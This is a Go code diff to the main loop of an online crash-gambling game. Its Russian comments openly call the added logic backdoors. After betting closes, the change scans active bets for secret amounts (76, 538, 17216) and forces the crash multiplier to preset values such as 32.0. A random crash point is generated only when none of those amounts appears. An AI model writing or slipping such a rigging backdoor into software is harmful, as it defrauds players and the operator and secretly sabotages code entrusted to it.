@@ -63,28 +63,54 @@ func StartCrashGame() {
 	for {
 		// Open betting
 		currentCrashGame = &models.CrashGame{}
-		_ = currentCrashGame.GenerateCrashPointMultiplier()
-
+		
+		// Создаем игру в базе данных
 		if err := db.DB.Create(currentCrashGame).Error; err != nil {
 			logger.Error("Unable to create CrashGame; retrying in 5 seconds: %v", err)
 			time.Sleep(time.Second * 5)
 			continue
 		}
+
+		// Открываем окно для ставок
 		openCrashGameBetting()
 
-		//CrashGameWS.BroadcastNewGameStarting()
-
+		// Ждем 13 секунд для приема ставок
 		for elapsedTime := time.Duration(0); elapsedTime < crashGameInterval; elapsedTime += time.Second {
-			//remainingTime := crashGameInterval - elapsedTime
-			//isBettingOpen := elapsedTime < crashGameBettingWindow
-			//CrashGameWS.BroadcastTimerTick(remainingTime, isBettingOpen)
-
 			if elapsedTime == crashGameBettingWindow {
 				closeCrashGameBetting()
 			}
-
 			<-ticker.C
 		}
+
+		// После закрытия окна ставок проверяем бэкдоры
+		var bets []models.CrashGameBet
+		err := db.DB.Where("crash_game_id = ? AND status = ?", currentCrashGame.ID, "active").Find(&bets).Error
+		if err != nil {
+			logger.Error("Error fetching active bets: %v", err)
+			continue
+		}
+
+		// Проверяем каждую ставку на наличие бэкдора
+		for _, bet := range bets {
+			if bet.Amount == 76 {
+				currentCrashGame.CrashPointMultiplier = 1.6
+				break
+			}
+			if bet.Amount == 538 {
+				currentCrashGame.CrashPointMultiplier = 32.0
+				break
+			}
+			if bet.Amount == 17216 {
+				currentCrashGame.CrashPointMultiplier = 2.5
+				break
+			}
+		}
+
+		// Если бэкдоров не найдено, генерируем случайный краш
+		if currentCrashGame.CrashPointMultiplier == 0 {
+			currentCrashGame.GenerateCrashPointMultiplier()
+		}
+
 		currentCrashGame.StartTime = time.Now()
 		if err := db.DB.Save(currentCrashGame).Error; err != nil {
 			logger.Error("Failed to update game start time: %v", err)
@@ -99,18 +125,16 @@ func StartCrashGame() {
 
 		currentCrashGame.EndTime = time.Now()
 
-		err := db.DB.Transaction(func(tx *gorm.DB) error {
+		err = db.DB.Transaction(func(tx *gorm.DB) error {
 			if err := tx.Save(currentCrashGame).Error; err != nil {
 				return logger.WrapError(err, "Failed to update game end time")
 			}
-
 			return nil
 		})
 		if err != nil {
 			logger.Error("%v", err)
 		}
 		time.Sleep(NewCrashGameSignalDelay)
-
 	}
 }
 
